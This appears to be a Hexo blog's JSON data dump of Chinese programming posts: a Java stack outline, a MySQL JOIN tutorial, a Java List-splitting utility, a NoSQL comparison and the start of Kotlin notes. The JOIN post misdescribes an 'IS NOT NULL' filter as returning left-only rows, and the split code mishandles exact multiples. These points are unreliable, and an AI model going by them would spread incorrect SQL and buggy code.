通常使用Zookeeper作为注册中心，因为Zookeeper可以通过节点进行订阅和发布数据。</li>\n<li>监控中心：用于服务的监控和管理。<h4 id=\"ActiveMQ\"><a href=\"#ActiveMQ\" class=\"headerlink\" title=\"ActiveMQ\"></a>ActiveMQ</h4></li>\n</ul>\n<h4 id=\"Zookeeper\"><a href=\"#Zookeeper\" class=\"headerlink\" title=\"Zookeeper\"></a>Zookeeper</h4><pre><code>- Zookeeper最初时应用在大数据中的，被用于分布式系统中用于维护分布式应用配置的一致性。\n- 作为Dubbo的注册中心\n- 作为项目的配置中心\n首先动态加载相关bean，如果配置中心发生改变，对应的watcher监听到事件后，客户端则对相关bean进行重新注册，并且从配置中心获取到了最新数据，然后客户端直接调用getBean()方法获取相关bean实例，确保不再是之前引用。\n</code></pre><h4 id=\"Freemarker\"><a href=\"#Freemarker\" class=\"headerlink\" title=\"Freemarker\"></a>Freemarker</h4><h4 id=\"SwaggerAPI\"><a href=\"#SwaggerAPI\" class=\"headerlink\" title=\"SwaggerAPI\"></a>SwaggerAPI</h4><h4 id=\"Solr\"><a href=\"#Solr\" class=\"headerlink\" title=\"Solr\"></a>Solr</h4><h4 id=\"FastDFS\"><a href=\"#FastDFS\" class=\"headerlink\" title=\"FastDFS\"></a>FastDFS</h4><h4 id=\"定时任务框架\"><a href=\"#定时任务框架\" class=\"headerlink\" title=\"定时任务框架\"></a>定时任务框架</h4><ol>\n<li><strong>JDK</strong></li>\n<li><strong>Spring-Task</strong></li>\n<li><strong>Quartz</strong></li>\n<li><a href=\"http://blog.csdn.net/fanfan_v5/article/details/61310045\" target=\"_blank\" rel=\"noopener\"><strong>Elestic Job</strong></a></li>\n<li><strong>Zookeeper</strong></li>\n</ol>\n<h4 id=\"WebService（CXF）\"><a href=\"#WebService（CXF）\" class=\"headerlink\" title=\"WebService（CXF）\"></a>WebService（CXF）</h4><h4 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h4><h3 id=\"开发工具\"><a href=\"#开发工具\" class=\"headerlink\" title=\"开发工具\"></a>开发工具</h3><h4 id=\"IDEA\"><a href=\"#IDEA\" class=\"headerlink\" title=\"IDEA\"></a>IDEA</h4><h4 id=\"PostMan\"><a href=\"#PostMan\" class=\"headerlink\" title=\"PostMan\"></a>PostMan</h4><h4 id=\"Charles\"><a href=\"#Charles\" class=\"headerlink\" title=\"Charles\"></a>Charles</h4><h4 id=\"Datagrid\"><a href=\"#Datagrid\" class=\"headerlink\" title=\"Datagrid\"></a>Datagrid</h4><h4 id=\"Ubuntu\"><a href=\"#Ubuntu\" class=\"headerlink\" title=\"Ubuntu\"></a>Ubuntu</h4><h4 id=\"GIT\"><a href=\"#GIT\" class=\"headerlink\" title=\"GIT\"></a>GIT</h4><h3 id=\"加分项\"><a href=\"#加分项\" class=\"headerlink\" title=\"加分项\"></a>加分项</h3><h4 id=\"Kotlin\"><a href=\"#Kotlin\" class=\"headerlink\" title=\"Kotlin\"></a>Kotlin</h4><ul>\n<li>防止空指针</li>\n<li>Kotlin文件类型有class, object, menu, interface</li>\n<li>伴生对象对应java中的static</li>\n<li>但例采用object </li>\n<li>高阶函数</li>\n<li>Lambda表达式</li>\n<li>详见博客《Kotlin基础语法》<h4 id=\"Vertx\"><a href=\"#Vertx\" class=\"headerlink\" title=\"Vertx\"></a>Vertx</h4></li>\n<li>EvenBus异步执行，提高执行效率</li>\n<li>使用多层嵌套解决同步问题</li>\n<li>使用标签跳出指定层<h4 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h4></li>\n</ul>\n"},{"title":"Join查询","date":"2016-02-28T08:12:29.000Z","_content":"#### 数据表结构\n\n**表结构一:**\n![Mysql](Join查询/1.jpg)\n**表结构二:**\n![Mysql](Join查询/2.jpg)\n**Join从句的分类:**\n![Mysql](Join查询/3.jpg)\n#### Inner join\ninner join表示将两张表进行关联起来,查询里面的交集部分\n\n\tSELECT * FROM user1 INNER JOIN user2 WHERE user1.username = user2.name;\n**查询结果: **\n当查询*的时候是将两张表进行拼接起来\n![Mysql](Join查询/4.jpg)\n**左外链接用途**\n![Mysql](Join查询/5.jpg)\n左外链接一般查询的是左表的所有和右表所匹配的数据,匹配不上的全是null\n\n\tSELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name\n**查询结果:**\n![Mysql](Join查询/6.jpg)\n查询只存在于左表中的数据\n\n\tSELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name WHERE user2.name IS NOT NULL\n**查询结果:**\n![Mysql](Join查询/7.jpg)\n#### 右外链接\n\n右外链接和左外链接是相对的,只不过是以右表为基准\n![Mysql](Join查询/8.jpg)\n#### 全连接\n\n全连接表示可以查询出两个表所有的数据或两个表交集之外的数据\n![Mysql](Join查询/9.jpg)\n**代码演示:**\n\n\tSELECT * FROM user1  LEFT JOIN user2 ON user1.username = user2.name UNION ALL SELECT *  FROM user1 RIGHT JOIN user2 ON user1.username = user2.name\n**查询结果:**\n![Mysql](Join查询/10.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Join查询.md","raw":"---\ntitle: Join查询\ndate: 2016-02-28 16:12:29\ntags: MySql\n---\n#### 数据表结构\n\n**表结构一:**\n![Mysql](Join查询/1.jpg)\n**表结构二:**\n![Mysql](Join查询/2.jpg)\n**Join从句的分类:**\n![Mysql](Join查询/3.jpg)\n#### Inner join\ninner join表示将两张表进行关联起来,查询里面的交集部分\n\n\tSELECT * FROM user1 INNER JOIN user2 WHERE user1.username = user2.name;\n**查询结果: **\n当查询*的时候是将两张表进行拼接起来\n![Mysql](Join查询/4.jpg)\n**左外链接用途**\n![Mysql](Join查询/5.jpg)\n左外链接一般查询的是左表的所有和右表所匹配的数据,匹配不上的全是null\n\n\tSELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name\n**查询结果:**\n![Mysql](Join查询/6.jpg)\n查询只存在于左表中的数据\n\n\tSELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name WHERE user2.name IS NOT NULL\n**查询结果:**\n![Mysql](Join查询/7.jpg)\n#### 右外链接\n\n右外链接和左外链接是相对的,只不过是以右表为基准\n![Mysql](Join查询/8.jpg)\n#### 全连接\n\n全连接表示可以查询出两个表所有的数据或两个表交集之外的数据\n![Mysql](Join查询/9.jpg)\n**代码演示:**\n\n\tSELECT * FROM user1  LEFT JOIN user2 ON user1.username = user2.name UNION ALL SELECT *  FROM user1 RIGHT JOIN user2 ON user1.username = user2.name\n**查询结果:**\n![Mysql](Join查询/10.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Join查询","published":1,"updated":"2018-02-09T08:20:42.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw0000wmfahpaoo6shq","content":"<h4 id=\"数据表结构\"><a href=\"#数据表结构\" class=\"headerlink\" title=\"数据表结构\"></a>数据表结构</h4><p><strong>表结构一:</strong><br><img src=\"Join查询/1.jpg\" alt=\"Mysql\"><br><strong>表结构二:</strong><br><img src=\"Join查询/2.jpg\" alt=\"Mysql\"><br><strong>Join从句的分类:</strong><br><img src=\"Join查询/3.jpg\" alt=\"Mysql\"></p>\n<h4 id=\"Inner-join\"><a href=\"#Inner-join\" class=\"headerlink\" title=\"Inner join\"></a>Inner join</h4><p>inner join表示将两张表进行关联起来,查询里面的交集部分</p>\n<pre><code>SELECT * FROM user1 INNER JOIN user2 WHERE user1.username = user2.name;\n</code></pre><p><strong>查询结果: </strong><br>当查询*的时候是将两张表进行拼接起来<br><img src=\"Join查询/4.jpg\" alt=\"Mysql\"><br><strong>左外链接用途</strong><br><img src=\"Join查询/5.jpg\" alt=\"Mysql\"><br>左外链接一般查询的是左表的所有和右表所匹配的数据,匹配不上的全是null</p>\n<pre><code>SELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name\n</code></pre><p><strong>查询结果:</strong><br><img src=\"Join查询/6.jpg\" alt=\"Mysql\"><br>查询只存在于左表中的数据</p>\n<pre><code>SELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name WHERE user2.name IS NOT NULL\n</code></pre><p><strong>查询结果:</strong><br><img src=\"Join查询/7.jpg\" alt=\"Mysql\"></p>\n<h4 id=\"右外链接\"><a href=\"#右外链接\" class=\"headerlink\" title=\"右外链接\"></a>右外链接</h4><p>右外链接和左外链接是相对的,只不过是以右表为基准<br><img src=\"Join查询/8.jpg\" alt=\"Mysql\"></p>\n<h4 id=\"全连接\"><a href=\"#全连接\" class=\"headerlink\" title=\"全连接\"></a>全连接</h4><p>全连接表示可以查询出两个表所有的数据或两个表交集之外的数据<br><img src=\"Join查询/9.jpg\" alt=\"Mysql\"><br><strong>代码演示:</strong></p>\n<pre><code>SELECT * FROM user1  LEFT JOIN user2 ON user1.username = user2.name UNION ALL SELECT *  FROM user1 RIGHT JOIN user2 ON user1.username = user2.name\n</code></pre><p><strong>查询结果:</strong><br><img src=\"Join查询/10.jpg\" alt=\"Mysql\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"数据表结构\"><a href=\"#数据表结构\" class=\"headerlink\" title=\"数据表结构\"></a>数据表结构</h4><p><strong>表结构一:</strong><br><img src=\"Join查询/1.jpg\" alt=\"Mysql\"><br><strong>表结构二:</strong><br><img src=\"Join查询/2.jpg\" alt=\"Mysql\"><br><strong>Join从句的分类:</strong><br><img src=\"Join查询/3.jpg\" alt=\"Mysql\"></p>\n<h4 id=\"Inner-join\"><a href=\"#Inner-join\" class=\"headerlink\" title=\"Inner join\"></a>Inner join</h4><p>inner join表示将两张表进行关联起来,查询里面的交集部分</p>\n<pre><code>SELECT * FROM user1 INNER JOIN user2 WHERE user1.username = user2.name;\n</code></pre><p><strong>查询结果: </strong><br>当查询*的时候是将两张表进行拼接起来<br><img src=\"Join查询/4.jpg\" alt=\"Mysql\"><br><strong>左外链接用途</strong><br><img src=\"Join查询/5.jpg\" alt=\"Mysql\"><br>左外链接一般查询的是左表的所有和右表所匹配的数据,匹配不上的全是null</p>\n<pre><code>SELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name\n</code></pre><p><strong>查询结果:</strong><br><img src=\"Join查询/6.jpg\" alt=\"Mysql\"><br>查询只存在于左表中的数据</p>\n<pre><code>SELECT * FROM user1 LEFT JOIN user2 on user1.username = user2.name WHERE user2.name IS NOT NULL\n</code></pre><p><strong>查询结果:</strong><br><img src=\"Join查询/7.jpg\" alt=\"Mysql\"></p>\n<h4 id=\"右外链接\"><a href=\"#右外链接\" class=\"headerlink\" title=\"右外链接\"></a>右外链接</h4><p>右外链接和左外链接是相对的,只不过是以右表为基准<br><img src=\"Join查询/8.jpg\" alt=\"Mysql\"></p>\n<h4 id=\"全连接\"><a href=\"#全连接\" class=\"headerlink\" title=\"全连接\"></a>全连接</h4><p>全连接表示可以查询出两个表所有的数据或两个表交集之外的数据<br><img src=\"Join查询/9.jpg\" alt=\"Mysql\"><br><strong>代码演示:</strong></p>\n<pre><code>SELECT * FROM user1  LEFT JOIN user2 ON user1.username = user2.name UNION ALL SELECT *  FROM user1 RIGHT JOIN user2 ON user1.username = user2.name\n</code></pre><p><strong>查询结果:</strong><br><img src=\"Join查询/10.jpg\" alt=\"Mysql\"></p>\n"},{"title":"List集合切割的工具类","date":"2018-01-31T08:05:53.000Z","_content":"#### List集合切割的工具类\n\n**问题背景:**\n\n我们在处理List集合的时候难免会遇到集合的size比较大,这时候我们就需要将一个比较大的list集合拆分成几个size比较小的集合进型处理,这样操作主要是考虑到了性能的问题,所以以下的工具类是针对于一个大的List集合进行拆分的过程\n\n**代码实现:**\n\n    /**\n     * 切割List集合,将其分成等分的\n     * \n     * @param source\n     * @param pageSize\n     * @return\n     */\n    public static <T> List<List<T>> splitList(List<T> source, Integer pageSize) {\n        if (null == source || source.size() == 0) {\n            return null;\n        }\n        int size = source.size();\n        int num = size / pageSize + 1;\n\n        // 切割list集合\n        List<List<T>> target = new ArrayList<List<T>>();\n        List<T> subList = null;\n        for (int i = 0; i < num; i++) {\n            int from = i * pageSize;\n            //如果不是最后一个集合\n            if (i != num - 1) {\n                subList = source.subList(from, from + pageSize);\n            } else {\n                subList = source.subList(from, from + size % pageSize);\n            }\n            target.add(subList);\n        }\n\n        return target;\n    }\n}\n**代码理解**\n\nnum:表示大集合将要被切割的个数 \npageSize表示每个小集合的size \nsubList = source.subList(from, from + pageSize);如果不是最后一个集合,我们需要切割from 到from + pageSize个 \nsubList = source.subList(from, from + size % pageSize); 如果切割刀最后一个集合的时候,我们需要从from切割到from + size的余数(size % pageSize)\n\n功能测试\n\n    public static void main(String[] args) {\n\n        List<Integer> list = new ArrayList<Integer>();\n        list.add(1);\n        list.add(2);\n        list.add(3);\n        list.add(4);\n        list.add(5);\n        list.add(5);\n        list.add(6);\n\n        List<List<Integer>> splitList = splitList(list, 2);\n        System.out.println(splitList);\n    }\n测试运行结果 \n[[1, 2], [3, 4], [5, 5], [6]]","source":"_posts/List集合切割的工具类.md","raw":"---\ntitle: List集合切割的工具类\ndate: 2018-01-31 16:05:53\ntags: Utilities\n---\n#### List集合切割的工具类\n\n**问题背景:**\n\n我们在处理List集合的时候难免会遇到集合的size比较大,这时候我们就需要将一个比较大的list集合拆分成几个size比较小的集合进型处理,这样操作主要是考虑到了性能的问题,所以以下的工具类是针对于一个大的List集合进行拆分的过程\n\n**代码实现:**\n\n    /**\n     * 切割List集合,将其分成等分的\n     * \n     * @param source\n     * @param pageSize\n     * @return\n     */\n    public static <T> List<List<T>> splitList(List<T> source, Integer pageSize) {\n        if (null == source || source.size() == 0) {\n            return null;\n        }\n        int size = source.size();\n        int num = size / pageSize + 1;\n\n        // 切割list集合\n        List<List<T>> target = new ArrayList<List<T>>();\n        List<T> subList = null;\n        for (int i = 0; i < num; i++) {\n            int from = i * pageSize;\n            //如果不是最后一个集合\n            if (i != num - 1) {\n                subList = source.subList(from, from + pageSize);\n            } else {\n                subList = source.subList(from, from + size % pageSize);\n            }\n            target.add(subList);\n        }\n\n        return target;\n    }\n}\n**代码理解**\n\nnum:表示大集合将要被切割的个数 \npageSize表示每个小集合的size \nsubList = source.subList(from, from + pageSize);如果不是最后一个集合,我们需要切割from 到from + pageSize个 \nsubList = source.subList(from, from + size % pageSize); 如果切割刀最后一个集合的时候,我们需要从from切割到from + size的余数(size % pageSize)\n\n功能测试\n\n    public static void main(String[] args) {\n\n        List<Integer> list = new ArrayList<Integer>();\n        list.add(1);\n        list.add(2);\n        list.add(3);\n        list.add(4);\n        list.add(5);\n        list.add(5);\n        list.add(6);\n\n        List<List<Integer>> splitList = splitList(list, 2);\n        System.out.println(splitList);\n    }\n测试运行结果 \n[[1, 2], [3, 4], [5, 5], [6]]","slug":"List集合切割的工具类","published":1,"updated":"2018-01-31T08:07:50.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw1000zmfahbi0y821k","content":"<h4 id=\"List集合切割的工具类\"><a href=\"#List集合切割的工具类\" class=\"headerlink\" title=\"List集合切割的工具类\"></a>List集合切割的工具类</h4><p><strong>问题背景:</strong></p>\n<p>我们在处理List集合的时候难免会遇到集合的size比较大,这时候我们就需要将一个比较大的list集合拆分成几个size比较小的集合进型处理,这样操作主要是考虑到了性能的问题,所以以下的工具类是针对于一个大的List集合进行拆分的过程</p>\n<p><strong>代码实现:</strong></p>\n<pre><code>/**\n * 切割List集合,将其分成等分的\n * \n * @param source\n * @param pageSize\n * @return\n */\npublic static &lt;T&gt; List&lt;List&lt;T&gt;&gt; splitList(List&lt;T&gt; source, Integer pageSize) {\n    if (null == source || source.size() == 0) {\n        return null;\n    }\n    int size = source.size();\n    int num = size / pageSize + 1;\n\n    // 切割list集合\n    List&lt;List&lt;T&gt;&gt; target = new ArrayList&lt;List&lt;T&gt;&gt;();\n    List&lt;T&gt; subList = null;\n    for (int i = 0; i &lt; num; i++) {\n        int from = i * pageSize;\n        //如果不是最后一个集合\n        if (i != num - 1) {\n            subList = source.subList(from, from + pageSize);\n        } else {\n            subList = source.subList(from, from + size % pageSize);\n        }\n        target.add(subList);\n    }\n\n    return target;\n}\n</code></pre><p>}<br><strong>代码理解</strong></p>\n<p>num:表示大集合将要被切割的个数<br>pageSize表示每个小集合的size<br>subList = source.subList(from, from + pageSize);如果不是最后一个集合,我们需要切割from 到from + pageSize个<br>subList = source.subList(from, from + size % pageSize); 如果切割刀最后一个集合的时候,我们需要从from切割到from + size的余数(size % pageSize)</p>\n<p>功能测试</p>\n<pre><code>public static void main(String[] args) {\n\n    List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();\n    list.add(1);\n    list.add(2);\n    list.add(3);\n    list.add(4);\n    list.add(5);\n    list.add(5);\n    list.add(6);\n\n    List&lt;List&lt;Integer&gt;&gt; splitList = splitList(list, 2);\n    System.out.println(splitList);\n}\n</code></pre><p>测试运行结果<br>[[1, 2], [3, 4], [5, 5], [6]]</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"List集合切割的工具类\"><a href=\"#List集合切割的工具类\" class=\"headerlink\" title=\"List集合切割的工具类\"></a>List集合切割的工具类</h4><p><strong>问题背景:</strong></p>\n<p>我们在处理List集合的时候难免会遇到集合的size比较大,这时候我们就需要将一个比较大的list集合拆分成几个size比较小的集合进型处理,这样操作主要是考虑到了性能的问题,所以以下的工具类是针对于一个大的List集合进行拆分的过程</p>\n<p><strong>代码实现:</strong></p>\n<pre><code>/**\n * 切割List集合,将其分成等分的\n * \n * @param source\n * @param pageSize\n * @return\n */\npublic static &lt;T&gt; List&lt;List&lt;T&gt;&gt; splitList(List&lt;T&gt; source, Integer pageSize) {\n    if (null == source || source.size() == 0) {\n        return null;\n    }\n    int size = source.size();\n    int num = size / pageSize + 1;\n\n    // 切割list集合\n    List&lt;List&lt;T&gt;&gt; target = new ArrayList&lt;List&lt;T&gt;&gt;();\n    List&lt;T&gt; subList = null;\n    for (int i = 0; i &lt; num; i++) {\n        int from = i * pageSize;\n        //如果不是最后一个集合\n        if (i != num - 1) {\n            subList = source.subList(from, from + pageSize);\n        } else {\n            subList = source.subList(from, from + size % pageSize);\n        }\n        target.add(subList);\n    }\n\n    return target;\n}\n</code></pre><p>}<br><strong>代码理解</strong></p>\n<p>num:表示大集合将要被切割的个数<br>pageSize表示每个小集合的size<br>subList = source.subList(from, from + pageSize);如果不是最后一个集合,我们需要切割from 到from + pageSize个<br>subList = source.subList(from, from + size % pageSize); 如果切割刀最后一个集合的时候,我们需要从from切割到from + size的余数(size % pageSize)</p>\n<p>功能测试</p>\n<pre><code>public static void main(String[] args) {\n\n    List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();\n    list.add(1);\n    list.add(2);\n    list.add(3);\n    list.add(4);\n    list.add(5);\n    list.add(5);\n    list.add(6);\n\n    List&lt;List&lt;Integer&gt;&gt; splitList = splitList(list, 2);\n    System.out.println(splitList);\n}\n</code></pre><p>测试运行结果<br>[[1, 2], [3, 4], [5, 5], [6]]</p>\n"},{"title":"MongoDB、Redis和Hbase的区别","date":"2016-08-11T07:24:42.000Z","_content":"#### 关于NoSQL(NoSQL is Not Only SQL)\nNoSQL出现的背景大概是因为随着数据量的扩大，在一些对数据集的分析中，传统的关系型数据库的计算成本变得很大。NoSQL凭借着它高大上的“易扩展、大数据、高可用、高性能、灵活性”，强势登场。\n#### 关于NoSQL的种类\n![NoSQL](MongoDB、Redis和Hbase的区别/1.png)\n#### 区别和特点\n1. HBase（列存储）\n两大用途：\n特别适用于简单数据写入（如“消息类”应用）和海量、结构简单数据的查询（如“详单类”应用）。特别地，适合稀疏表。（个人觉得存个网页内容是极好极好的）\n作为MapReduce的后台数据源，以支撑离线分析型应用。\n场景：Facebook的消息类应用，包括Messages、Chats、Emails和SMS系统，用的都是HBase；淘宝的WEB版阿里旺旺，后台是HBase；小米的米聊用的也是HBase；移动某省公司的手机详单查询系统。（单次分析，只能scan全表或者一个范围内的）\n2. MongoDB\n是一个介于关系型和非关系型之间的一个产品吧，类SQL语言，支持索引\nMongoDb在类SQL语句操作方面目前比HBase具备更多一些优势，有二级索引，支持相比于HBase更复杂的集合查找等。\nBSON的数据结构使得处理文档型数据更为直接。支持复杂的数据结构\nMongoDb也支持mapreduce，但由于HBase跟Hadoop的结合更为紧密，Mongo在数据分片等mapreduce必须的属性上不如HBase这么直接，需要额外处理。\n3. Redis\nRedis为内存型KV系统，处理的数据量要小于HBase与MongoDB\nRedis很适合用来做缓存，但除此之外，它实际上还可以在一些“读写分离”的场景下作为“读库”来用，特别是用来存放Hadoop或Spark的分析结果。\nRedis的读写性能在100,000 ops/s左右，时延一般为10～70微妙左右；而HBase的单机读写性能一般不会超过1,000ops/s，时延则在1～5毫秒之间。\nRedis的魅力还在于它不像HBase只支持简单的字符串，他还支持集合set，有序集合zset和哈希hash","source":"_posts/MongoDB、Redis和Hbase的区别.md","raw":"---\ntitle: MongoDB、Redis和Hbase的区别\ndate: 2016-08-11 15:24:42\ntags: NoSQL\n---\n#### 关于NoSQL(NoSQL is Not Only SQL)\nNoSQL出现的背景大概是因为随着数据量的扩大，在一些对数据集的分析中，传统的关系型数据库的计算成本变得很大。NoSQL凭借着它高大上的“易扩展、大数据、高可用、高性能、灵活性”，强势登场。\n#### 关于NoSQL的种类\n![NoSQL](MongoDB、Redis和Hbase的区别/1.png)\n#### 区别和特点\n1. HBase（列存储）\n两大用途：\n特别适用于简单数据写入（如“消息类”应用）和海量、结构简单数据的查询（如“详单类”应用）。特别地，适合稀疏表。（个人觉得存个网页内容是极好极好的）\n作为MapReduce的后台数据源，以支撑离线分析型应用。\n场景：Facebook的消息类应用，包括Messages、Chats、Emails和SMS系统，用的都是HBase；淘宝的WEB版阿里旺旺，后台是HBase；小米的米聊用的也是HBase；移动某省公司的手机详单查询系统。（单次分析，只能scan全表或者一个范围内的）\n2. MongoDB\n是一个介于关系型和非关系型之间的一个产品吧，类SQL语言，支持索引\nMongoDb在类SQL语句操作方面目前比HBase具备更多一些优势，有二级索引，支持相比于HBase更复杂的集合查找等。\nBSON的数据结构使得处理文档型数据更为直接。支持复杂的数据结构\nMongoDb也支持mapreduce，但由于HBase跟Hadoop的结合更为紧密，Mongo在数据分片等mapreduce必须的属性上不如HBase这么直接，需要额外处理。\n3. Redis\nRedis为内存型KV系统，处理的数据量要小于HBase与MongoDB\nRedis很适合用来做缓存，但除此之外，它实际上还可以在一些“读写分离”的场景下作为“读库”来用，特别是用来存放Hadoop或Spark的分析结果。\nRedis的读写性能在100,000 ops/s左右，时延一般为10～70微妙左右；而HBase的单机读写性能一般不会超过1,000ops/s，时延则在1～5毫秒之间。\nRedis的魅力还在于它不像HBase只支持简单的字符串，他还支持集合set，有序集合zset和哈希hash","slug":"MongoDB、Redis和Hbase的区别","published":1,"updated":"2018-01-31T07:28:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw20010mfahdny1ia24","content":"<h4 id=\"关于NoSQL-NoSQL-is-Not-Only-SQL\"><a href=\"#关于NoSQL-NoSQL-is-Not-Only-SQL\" class=\"headerlink\" title=\"关于NoSQL(NoSQL is Not Only SQL)\"></a>关于NoSQL(NoSQL is Not Only SQL)</h4><p>NoSQL出现的背景大概是因为随着数据量的扩大，在一些对数据集的分析中，传统的关系型数据库的计算成本变得很大。NoSQL凭借着它高大上的“易扩展、大数据、高可用、高性能、灵活性”，强势登场。</p>\n<h4 id=\"关于NoSQL的种类\"><a href=\"#关于NoSQL的种类\" class=\"headerlink\" title=\"关于NoSQL的种类\"></a>关于NoSQL的种类</h4><p><img src=\"MongoDB、Redis和Hbase的区别/1.png\" alt=\"NoSQL\"></p>\n<h4 id=\"区别和特点\"><a href=\"#区别和特点\" class=\"headerlink\" title=\"区别和特点\"></a>区别和特点</h4><ol>\n<li>HBase（列存储）<br>两大用途：<br>特别适用于简单数据写入（如“消息类”应用）和海量、结构简单数据的查询（如“详单类”应用）。特别地，适合稀疏表。（个人觉得存个网页内容是极好极好的）<br>作为MapReduce的后台数据源，以支撑离线分析型应用。<br>场景：Facebook的消息类应用，包括Messages、Chats、Emails和SMS系统，用的都是HBase；淘宝的WEB版阿里旺旺，后台是HBase；小米的米聊用的也是HBase；移动某省公司的手机详单查询系统。（单次分析，只能scan全表或者一个范围内的）</li>\n<li>MongoDB<br>是一个介于关系型和非关系型之间的一个产品吧，类SQL语言，支持索引<br>MongoDb在类SQL语句操作方面目前比HBase具备更多一些优势，有二级索引，支持相比于HBase更复杂的集合查找等。<br>BSON的数据结构使得处理文档型数据更为直接。支持复杂的数据结构<br>MongoDb也支持mapreduce，但由于HBase跟Hadoop的结合更为紧密，Mongo在数据分片等mapreduce必须的属性上不如HBase这么直接，需要额外处理。</li>\n<li>Redis<br>Redis为内存型KV系统，处理的数据量要小于HBase与MongoDB<br>Redis很适合用来做缓存，但除此之外，它实际上还可以在一些“读写分离”的场景下作为“读库”来用，特别是用来存放Hadoop或Spark的分析结果。<br>Redis的读写性能在100,000 ops/s左右，时延一般为10～70微妙左右；而HBase的单机读写性能一般不会超过1,000ops/s，时延则在1～5毫秒之间。<br>Redis的魅力还在于它不像HBase只支持简单的字符串，他还支持集合set，有序集合zset和哈希hash</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"关于NoSQL-NoSQL-is-Not-Only-SQL\"><a href=\"#关于NoSQL-NoSQL-is-Not-Only-SQL\" class=\"headerlink\" title=\"关于NoSQL(NoSQL is Not Only SQL)\"></a>关于NoSQL(NoSQL is Not Only SQL)</h4><p>NoSQL出现的背景大概是因为随着数据量的扩大，在一些对数据集的分析中，传统的关系型数据库的计算成本变得很大。NoSQL凭借着它高大上的“易扩展、大数据、高可用、高性能、灵活性”，强势登场。</p>\n<h4 id=\"关于NoSQL的种类\"><a href=\"#关于NoSQL的种类\" class=\"headerlink\" title=\"关于NoSQL的种类\"></a>关于NoSQL的种类</h4><p><img src=\"MongoDB、Redis和Hbase的区别/1.png\" alt=\"NoSQL\"></p>\n<h4 id=\"区别和特点\"><a href=\"#区别和特点\" class=\"headerlink\" title=\"区别和特点\"></a>区别和特点</h4><ol>\n<li>HBase（列存储）<br>两大用途：<br>特别适用于简单数据写入（如“消息类”应用）和海量、结构简单数据的查询（如“详单类”应用）。特别地，适合稀疏表。（个人觉得存个网页内容是极好极好的）<br>作为MapReduce的后台数据源，以支撑离线分析型应用。<br>场景：Facebook的消息类应用，包括Messages、Chats、Emails和SMS系统，用的都是HBase；淘宝的WEB版阿里旺旺，后台是HBase；小米的米聊用的也是HBase；移动某省公司的手机详单查询系统。（单次分析，只能scan全表或者一个范围内的）</li>\n<li>MongoDB<br>是一个介于关系型和非关系型之间的一个产品吧，类SQL语言，支持索引<br>MongoDb在类SQL语句操作方面目前比HBase具备更多一些优势，有二级索引，支持相比于HBase更复杂的集合查找等。<br>BSON的数据结构使得处理文档型数据更为直接。支持复杂的数据结构<br>MongoDb也支持mapreduce，但由于HBase跟Hadoop的结合更为紧密，Mongo在数据分片等mapreduce必须的属性上不如HBase这么直接，需要额外处理。</li>\n<li>Redis<br>Redis为内存型KV系统，处理的数据量要小于HBase与MongoDB<br>Redis很适合用来做缓存，但除此之外，它实际上还可以在一些“读写分离”的场景下作为“读库”来用，特别是用来存放Hadoop或Spark的分析结果。<br>Redis的读写性能在100,000 ops/s左右，时延一般为10～70微妙左右；而HBase的单机读写性能一般不会超过1,000ops/s，时延则在1～5毫秒之间。<br>Redis的魅力还在于它不像HBase只支持简单的字符串，他还支持集合set，有序集合zset和哈希hash</li>\n</ol>\n"},{"title":"Kotlin基础语法","date":"2017-12-31T05:39:32.000Z","_content":"\n**前言：**\n&emsp;&emsp;上海百联大宗内部员工培训系统是为了给内部员工提供一个高素质培训平台，也是百联研发部新技术实验平台。该系统前期采用的是Vertx作为系统框架，以Kotlin作为开发语言，以Vue作为前台框架。将来还会有更多的新技术应用于该平台。作为平台的开发人员，为了满足开发的需求，所以学习了Kotlin, 现将基本语法整理出来供大家学习，同时也便于日后查看。\n#### 空类型用法：\n![Kotlin](Kotlin基础语法/1.png)\nas : 类型转换关键字/包别名 \n安全类型转换: \n智能类型转换: \n#### 区间:\n![Kotlin](Kotlin基础语法/2.png)\n#### 数组的使用方法\n![Kotlin](Kotlin基础语法/3.png)\n#### 基本数据类型的数组\n![Kotlin](Kotlin基础语法/4.png)\n#### 常量与变量\n![Kotlin](Kotlin基础语法/5.png)\n#### Lamd表达式\n![Kotlin](Kotlin基础语法/6.png)\n#### Lamd表达式参数传递\n![Kotlin](Kotlin基础语法/7.png)\n#### 成员变量和局部变量的定义和区别：\n成员变量都是用val或var修饰的，而没有被这两个关键字修饰的变量都是局部变量\n![Kotlin](Kotlin基础语法/8.png)\n#### 变量的初始化\n![Kotlin](Kotlin基础语法/9.png)\n#### 成员变量的访问控制\n![Kotlin](Kotlin基础语法/10.png)\n#### 运算符的定义\n![Kotlin](Kotlin基础语法/11.png)\n#### Kotlin关键字：\n\n**operator:**定义运算符\n**infix:**定义中缀表达式\n**override:**重写父类方法\n**constructor:**构造器\n**const:**定义编译期常量\n**val:**定义普通成员常量\n**var:**定义成员变量\n\n**注意：**\n\n1. 在Kotlin中when，if语句和Lamda表达式一样具有返回值，返回值为最后一行的值\n\n2. 在Kotlin中默认的类和方法都是final的，要继承重写必须用关键字open，或者设置成abstract类型，重写方法必须使用override关键字\n\n#### if表达式\n![Kotlin](Kotlin基础语法/12.png)\n#### when、continue 和 break\nwhen表达式，Java中switch的替代品, 循环关键字continue和break\n![Kotlin](Kotlin基础语法/13.png)\n#### 具名参数\n![Kotlin](Kotlin基础语法/14.png)\n#### 变长参数\n![Kotlin](Kotlin基础语法/15.png)\n#### Sperat 